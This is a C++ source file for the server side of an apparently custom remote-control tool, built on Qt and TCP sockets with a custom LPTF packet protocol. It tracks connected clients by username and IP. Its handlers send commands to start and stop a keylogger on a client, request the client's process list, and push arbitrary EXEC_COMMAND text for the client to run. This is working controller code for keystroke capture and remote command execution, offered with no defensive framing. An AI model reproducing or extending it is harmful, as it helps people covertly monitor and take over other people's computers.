#include "ServerApp.hpp"

/**
 * @brief Constructs ServerApp and initializes networking from .env.
 * @param envFilePath Path to .env file containing port configuration.
 */
ServerApp::ServerApp(const std::string &envFilePath)
    : m_envFilePath(envFilePath)
{
#ifdef _WIN32
    SetConsoleOutputCP(CP_UTF8);
    SetConsoleCP(CP_UTF8);
#endif

    EnvLoader::loadEnv(m_envFilePath);
    int port = EnvLoader::loadPort(m_envFilePath);
    std::cout << "ServerApp: listening on port " << port << "...\n";

    m_serverSocket.bindSocket(port);
    m_serverSocket.listenSocket();
}

/**
 * @brief Destructor closes the listening socket.
 */
ServerApp::~ServerApp()
{
    m_serverSocket.closeSocket();
}

/**
 * @brief Prepares the read fd_set for select, including listener and clients.
 * @param readfds Reference to fd_set to populate.
 * @param maxFd Reference to current maximum file descriptor.
 * @param listenFd Output listening socket fd.
 */
void ServerApp::prepareFdSet(fd_set &readfds, int &maxFd, int &listenFd)
{
    FD_ZERO(&readfds);
    listenFd = m_serverSocket.getSocketFd();
    FD_SET(listenFd, &readfds);
    maxFd = listenFd;
    for (const auto &c : m_clients)
    {
        int fd = c->getSocketFd();
        FD_SET(fd, &readfds);
        if (fd > maxFd)
            maxFd = fd;
    }
}

/**
 * @brief Accepts a new client if the listening socket is ready.
 * @param readfds Current read fd_set from select.
 * @param listenFd Listening socket file descriptor.
 */
void ServerApp::acceptNewClientIfAny(const fd_set &readfds, int listenFd)
{
    if (FD_ISSET(listenFd, &readfds))
    {
        auto newCl = m_serverSocket.acceptSocket();
        std::cout << "Client connected: " << newCl->getClientIP() << " (awaiting user info)\n";
        m_clients.push_back(std::move(newCl));
        m_clientUsers.emplace_back();
    }
}

/**
 * @brief Processes a single client: handles GET_INFO or other packets.
 * @param idx Index of client in vector; may be modified if client is removed.
 * @param readfds fd_set from select() indicating readable sockets.
 * @param nextSessionId Counter used to assign unique session IDs.
 */
void ServerApp::processClient(size_t &idx, const fd_set &readfds, uint32_t &nextSessionId)
{
    auto &client = m_clients[idx];
    int fd = client->getSocketFd();
    if (!FD_ISSET(fd, &readfds))
    {
        ++idx;
        return;
    }

    try
    {
        auto data = client->recvBinary();
        auto pkt = LPTF_Packet::deserialize(data);
        std::string clientInfo = m_clientUsers[idx] + " " + client->getClientIP();

        if (pkt.getType() == PacketType::GET_INFO)
        {
            std::string payload(pkt.getPayload().begin(), pkt.getPayload().end());
            const std::string key = "\"username\":\"";
            std::string username;
            auto pos = payload.find(key);
            if (pos != std::string::npos)
            {
                pos += key.size();
                auto end = payload.find('"', pos);
                if (end != std::string::npos)
                    username = payload.substr(pos, end - pos);
            }
            m_clientUsers[idx] = username;
            clientInfo = username + " " + client->getClientIP();
            emit clientConnected(QString::fromStdString(clientInfo), nextSessionId++);
        }
        else
        {
            std::string msg(pkt.getPayload().begin(), pkt.getPayload().end());
            qDebug() << "[ServerApp] pkt=" << static_cast<int>(pkt.getType())
                     << " from" << QString::fromStdString(clientInfo)
                     << "payload size=" << msg.size();
            emit clientResponse(QString::fromStdString(clientInfo), QString::fromStdString(msg));
            std::string ackStr = "ACK: " + msg;
            LPTF_Packet ack(1, PacketType::RESPONSE, 0, 0, 0,
                            std::vector<uint8_t>(ackStr.begin(), ackStr.end()));
            client->sendBinary(ack.serialize());
        }
        ++idx;
    }
    catch (const std::exception &e)
    {
        std::cout << "Client disconnect: " << client->getClientIP()
                  << " (" << e.what() << ")\n";
        m_clients.erase(m_clients.begin() + idx);
        m_clientUsers.erase(m_clientUsers.begin() + idx);
    }
}

/**
 * @brief Main loop: waits for socket activity and dispatches to helpers.
 */
void ServerApp::run()
{
    std::cout << "Server ready, waiting for connections...\n";
    uint32_t nextSessionId = 1;

    while (true)
    {
        fd_set readfds;
        int maxFd = 0, listenFd = 0;
        prepareFdSet(readfds, maxFd, listenFd);
        if (select(maxFd + 1, &readfds, nullptr, nullptr, nullptr) < 0)
        {
            std::cerr << "select() error: " << std::strerror(errno) << "\n";
            break;
        }
        acceptNewClientIfAny(readfds, listenFd);
        for (size_t i = 0; i < m_clients.size();)
            processClient(i, readfds, nextSessionId);
    }
}

/**
 * @brief Sends a GET_INFO request to a client.
 * @param clientId Identifier of target client (username + IP).
 */
void ServerApp::onGetInfoSys(const QString &clientId)
{
    uint32_t sessionId = 0;
    LPTF_Packet packet(1, PacketType::GET_INFO, 0, 0, sessionId, {});
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
}

/**
 * @brief Sends the "start" keylogger command to client.
 * @param clientId Identifier of target client.
 */
void ServerApp::onStartKeylogger(const QString &clientId)
{
    qDebug() << "[ServerApp] onStartKeylogger for" << clientId;
    const std::string cmdStart = "start";
    std::vector<uint8_t> startPayload(cmdStart.begin(), cmdStart.end());
    const uint32_t packetId = 1;
    const uint32_t sessionId = 0;
    LPTF_Packet packet(1, PacketType::KEYLOG, 0, packetId, sessionId, startPayload);
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
    qDebug() << "[ServerApp] Keylogger started for" << clientId;
}

/**
 * @brief Sends the "stop" keylogger command to client.
 * @param clientId Identifier of target client.
 */
void ServerApp::onStopKeylogger(const QString &clientId)
{
    qDebug() << "[ServerApp] onStopKeylogger for" << clientId;
    const std::string cmdStop = "stop";
    std::vector<uint8_t> stopPayload(cmdStop.begin(), cmdStop.end());
    const uint32_t packetId = 1;
    const uint32_t sessionId = 0;
    LPTF_Packet packet(1, PacketType::KEYLOG, 0, packetId, sessionId, stopPayload);
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
    qDebug() << "[ServerApp] Keylogger stopped for" << clientId;
}

/**
 * @brief Requests process list from a client.
 * @param clientId Identifier of target client.
 * @param namesOnly If true, only names are requested.
 */
void ServerApp::onRequestProcessList(const QString &clientId, bool namesOnly)
{
    qDebug() << "[ServerApp] onRequestProcessList for" << clientId << "namesOnly=" << namesOnly;
    uint32_t sessionId = 0;
    uint8_t flags = namesOnly ? 1 : 0;
    LPTF_Packet packet(1, PacketType::PROCESS_LIST, flags, 0, sessionId, {});
    auto raw = packet.serialize();
    QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
    sendToClientInternal(clientId, qraw);
}

/**
 * @brief Public wrapper to forward arbitrary data to a client.
 * @param clientInfo Identifier (username + IP) of target client.
 * @param data Binary payload.
 */
void ServerApp::onSendToClient(const QString &clientInfo, const QByteArray &data)
{
    // Wrap the command text in an EXEC_COMMAND packet
    qDebug() << "[ServerApp] onSendToClient for" << clientInfo << "data size=" << data.size();
    std::string cmd = data.toStdString();
    std::vector<uint8_t> payload(cmd.begin(), cmd.end());
    static uint32_t pktId = 1;
    uint32_t sessionId = 0;
    qDebug() << "[ServerApp] Sending EXEC_COMMAND to" << clientInfo << "with pktId=" << pktId;
    LPTF_Packet packet(1, PacketType::EXEC_COMMAND, 0, pktId++, sessionId, payload);
    qDebug() << "[ServerApp] Packet serialized, size=" << packet.getPayload().size();
    auto raw = packet.serialize();

    qDebug() << "[ServerApp RAW] EXEC_COMMAND packet bytes:";
    QString hex;
    for (auto byte : raw)
        hex += QString("%1 ").arg((uint8_t)byte, 2, 16, QChar('0'));
    qDebug() << hex;

    qDebug() << "[ServerApp] Raw packet size=" << raw.size();
    QByteArray qraw(reinterpret_cast<const char *>(raw.data()), int(raw.size()));
    sendToClientInternal(clientInfo, qraw);
    qDebug() << "[ServerApp] EXEC_COMMAND packet sent to" << clientInfo;
}

/**
 * @brief Internal lookup by clientId and actual send over socket.
 * @param clientId Identifier (username + IP).
 * @param data Binary payload to transmit.
 */
void ServerApp::sendToClientInternal(const QString &clientId, const QByteArray &data)
{
    auto parts = clientId.split(' ');
    qDebug() << "[ServerApp] sendToClientInternal for clientId:" << clientId
             << "parts count:" << parts.size();
    const QString ip = (parts.size() >= 2 ? parts.last() : QString());
    for (const auto &sockPtr : m_clients)
    {
        qDebug() << "[ServerApp] comparing target" << ip << "to socket IP" << QString::fromStdString(sockPtr->getClientIP());
        if (QString::fromStdString(sockPtr->getClientIP()) == ip)
        {
            std::vector<uint8_t> raw(
                reinterpret_cast<const uint8_t *>(data.constData()),
                reinterpret_cast<const uint8_t *>(data.constData()) + data.size());
            sockPtr->sendBinary(raw);
            qDebug() << "[ServerApp] sendToClientInternal: sent to" << clientId;
            qDebug() << "[ServerApp] sendToClientInternal: data size=" << data.size();
            return;
        }
    }
    qWarning() << "sendToClientInternal: client not found:" << clientId;
}
